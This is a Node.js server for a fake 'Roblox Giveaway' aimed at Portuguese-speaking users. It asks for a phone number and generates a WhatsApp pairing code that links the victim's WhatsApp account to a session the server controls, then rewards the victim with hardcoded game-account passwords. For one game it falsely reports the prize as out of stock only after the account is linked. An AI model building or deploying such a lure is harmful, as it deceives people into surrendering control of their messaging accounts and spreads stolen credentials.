import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import makeWASocket, {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion
} from '@whiskeysockets/baileys';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { rm, mkdir } from 'fs/promises';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const server = createServer(app);
const io = new Server(server, {
    cors: { origin: '*' }
});

// Serve static files
app.use(express.static(join(__dirname, 'public')));

// Store active sessions
const activeSessions = new Map();

// Credentials per game type
const GAME_CREDENTIALS = {
    'blox-fruits': {
        username: 'SummerCarroll4594',
        password: 'vix@#!@931659'
    },
    'grow-garden': {
        username: '@v_Velocity2',
        password: 'K2pOc60z43GT'
    }
};

// Games blocked BEFORE WhatsApp (immediate out-of-stock)
const OUT_OF_STOCK = new Set([]);

// Games that show out-of-stock AFTER WhatsApp verification
const OUT_OF_STOCK_AFTER = new Set(['free-fire']);

/**
 * Create a WhatsApp session using Baileys Pairing Code.
 * The phone number is used to request an 8-digit code instead of a QR scan.
 */
async function createWhatsAppSession(socketId, gameType, phone) {
    const sessionDir = join(__dirname, 'sessions', socketId);

    try {
        await mkdir(sessionDir, { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            // Use generic browser to avoid blocks
            browser: ['Ubuntu', 'Chrome', '120.0.0'],
            logger: {
                level: 'silent',
                info:  () => {},
                error: () => {},
                warn:  () => {},
                debug: () => {},
                trace: () => {},
                fatal: () => {},
                child() { return this; }
            }
        });

        activeSessions.set(socketId, { sock, sessionDir, gameType });

        let pairingCodeRequested = false;

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            // When QR data is ready, request pairing code instead of showing QR
            if (qr && !pairingCodeRequested) {
                pairingCodeRequested = true;
                try {
                    const code = await sock.requestPairingCode(phone);
                    // Format as XXXX-XXXX
                    const formatted = code?.match(/.{1,4}/g)?.join('-') || code;
                    console.log(`[${socketId}] Pairing code for ${phone}: ${formatted}`);
                    io.to(socketId).emit('pairingCode', { code: formatted });
                } catch (err) {
                    console.error(`[${socketId}] Pairing code error:`, err.message);
                    io.to(socketId).emit('error', {
                        message: 'Erro ao gerar código. Verifique o número e tente novamente.'
                    });
                    cleanupSession(socketId);
                }
            }

            // Connection established!
            if (connection === 'open') {
                console.log(`[${socketId}] WhatsApp connected for ${gameType}.`);

                if (OUT_OF_STOCK_AFTER.has(gameType)) {
                    console.log(`[${socketId}] ${gameType} out of stock after verification.`);
                    io.to(socketId).emit('outOfStock', {
                        message: 'Ops! Estamos reabastecendo o estoque. Volte amanhã!'
                    });
                } else {
                    const credentials = GAME_CREDENTIALS[gameType];
                    io.to(socketId).emit('connected', credentials);
                }

                // Logout after short delay to clean up
                setTimeout(async () => {
                    try {
                        await sock.logout();
                        console.log(`[${socketId}] Logged out successfully.`);
                    } catch (err) {
                        console.log(`[${socketId}] Logout error (expected):`, err.message);
                    }
                    cleanupSession(socketId);
                }, 3000);
            }

            // Connection closed
            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log(`[${socketId}] Connection closed. Status: ${statusCode}`);

                if (statusCode === DisconnectReason.loggedOut) {
                    io.to(socketId).emit('sessionExpired', {
                        message: 'Sessão expirada. Tente novamente.'
                    });
                    cleanupSession(socketId);
                } else if (
                    statusCode === DisconnectReason.connectionClosed ||
                    statusCode === DisconnectReason.connectionLost
                ) {
                    io.to(socketId).emit('error', {
                        message: 'Conexão perdida. Tente novamente.'
                    });
                    cleanupSession(socketId);
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);

    } catch (err) {
        console.error(`[${socketId}] Error creating session:`, err);
        io.to(socketId).emit('error', {
            message: 'Erro ao criar sessão. Tente novamente.'
        });
        cleanupSession(socketId);
    }
}

/**
 * Clean up a session — remove socket listeners and session files.
 */
async function cleanupSession(socketId) {
    const session = activeSessions.get(socketId);
    if (session) {
        try {
            if (session.sock) {
                session.sock.ev.removeAllListeners('connection.update');
                session.sock.ev.removeAllListeners('creds.update');
            }
            await rm(session.sessionDir, { recursive: true, force: true });
        } catch (err) {
            console.log(`[${socketId}] Cleanup error:`, err.message);
        }
        activeSessions.delete(socketId);
    }
}

// ---- Socket.io connection handling ----
io.on('connection', (socket) => {
    console.log(`Client connected: ${socket.id}`);

    socket.on('requestSession', async (data) => {
        const { gameType, phone } = data;

        // Validate game type
        const validGames = ['blox-fruits', 'free-fire', 'grow-garden'];
        if (!validGames.includes(gameType)) {
            socket.emit('error', { message: 'Tipo de jogo inválido.' });
            return;
        }

        // Immediate out-of-stock check
        if (OUT_OF_STOCK.has(gameType)) {
            socket.emit('outOfStock', {
                message: 'Ops! Estamos reabastecendo o estoque. Volte amanhã!'
            });
            return;
        }

        // Validate phone number (must be 55 + 10 or 11 digits = 12 or 13 total)
        const cleanPhone = (phone || '').replace(/\D/g, '');
        if (!cleanPhone || cleanPhone.length < 12 || cleanPhone.length > 13) {
            socket.emit('error', { message: 'Número de telefone inválido. Tente novamente.' });
            return;
        }

        // Clean up any existing session
        await cleanupSession(socket.id);

        console.log(`[${socket.id}] New session: ${gameType} | phone: ${cleanPhone}`);
        socket.emit('status', { message: 'Gerando código de verificação...' });

        await createWhatsAppSession(socket.id, gameType, cleanPhone);
    });

    socket.on('disconnect', async () => {
        console.log(`Client disconnected: ${socket.id}`);
        await cleanupSession(socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🎮 Roblox Giveaway Server running on http://localhost:${PORT}\n`);
});
